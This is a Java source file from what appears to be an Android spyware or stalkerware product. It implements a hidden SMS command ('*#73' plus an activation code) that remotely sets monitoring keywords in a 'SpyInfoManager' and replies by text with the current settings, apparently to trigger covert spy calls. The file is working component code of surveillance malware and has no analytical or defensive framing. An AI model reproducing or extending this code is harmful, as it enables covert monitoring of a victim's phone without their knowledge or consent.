package com.fx.dalvik.smscommand.interpreter;

import android.content.Context;
import android.os.SystemClock;

import com.fx.dalvik.smscommand.SmsCommandHelper;
import com.fx.maind.ref.Customization;
import com.fx.preference.SpyInfoManager;
import com.fx.preference.SpyInfoManagerFactory;
import com.fx.util.FxResource;
import com.vvt.logger.FxLog;

public class SmsAddKeyword {
	
	private static final String TAG = "SmsAddKeyword";
 	private static final boolean LOGV = Customization.VERBOSE;
	
	public static final String COMMAND_ID = "*#73";
	public static final int MIN_LENGTH = 10;
	
	public static boolean isQueryCommand(Context context, String[] tokens) {
		return tokens.length == 2 && !SmsCommandHelper.isEndWithDebugTag(tokens);
	}
	
	// Enable Spy call command
	// <*#73><FK>
	// <*#73><FK><KW1>
	// <*#73><FK><KW1><KW2>
	public static String processCommand(Context context, String[] tokens) {
		if (LOGV) FxLog.v(TAG, "processCommand # Enter ..");
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 2 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 4 && SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 4 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 5 && SmsCommandHelper.isEndWithDebugTag(tokens));
		
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(context, tokens[1]);
		
		if (!activationCodeValidation.equals(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		// Check if there is keyword specified
		int count = tokens.length - (SmsCommandHelper.isEndWithDebugTag(tokens) ? 1 : 0);
		String keyword1 = count > 2 ? tokens[2] : null;
		String keyword2 = count > 3 ? tokens[3] : null;
		if (LOGV) {
			FxLog.v(TAG, String.format("keyword1: %s, len: %d", 
					keyword1, keyword1 == null ? 0 : keyword1.length()));
			FxLog.v(TAG, String.format("keyword2: %s, len: %d", 
					keyword2, keyword2 == null ? 0 : keyword2.length()));
		}
		
		SpyInfoManager spyInfoManager = SpyInfoManagerFactory.getSpyInfoManager(context);
		
		// Check keyword#1
		if (keyword1 != null) {
			if (!isValidLength(keyword1)) {
				return String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_KEYWORD);
			}
			else if (keyword1.length() > 0) {
				spyInfoManager.setKeyword1(keyword1.equalsIgnoreCase("n/a") ? "" : keyword1);
			}
		}
		
		// Check keyword#2
		if (keyword2 != null) {
			if (!isValidLength(keyword2)) {
				return String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_KEYWORD);
			}
			else if (keyword2.length() > 0) {
				spyInfoManager.setKeyword2(keyword2.equalsIgnoreCase("n/a") ? "" : keyword2);
			}
		}
		
		spyInfoManager.sendRequestUpdateSpyInfo();
		SystemClock.sleep(500);
		
		String queryK1 = spyInfoManager.getKeyword1();
		queryK1 = (queryK1 == null || queryK1.length() < 1) ? "N/A" : queryK1;
		
		String queryK2 = spyInfoManager.getKeyword2();
		queryK2 = (queryK2 == null || queryK2.length() < 1) ? "N/A" : queryK2;
		
		StringBuilder builder = new StringBuilder();
		builder.append(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK).append("\n");
		builder.append("K1: ").append(queryK1).append("\n");
		builder.append("K2: ").append(queryK2);
		
		if (LOGV) FxLog.v(TAG, "processCommand # EXIT ..");
		
		return builder.toString();
	}
	
	private static boolean isValidLength(String keyword) {
		int length = keyword.length();
		return length == 0 || keyword.equalsIgnoreCase("n/a") || length >= MIN_LENGTH;
	}

}
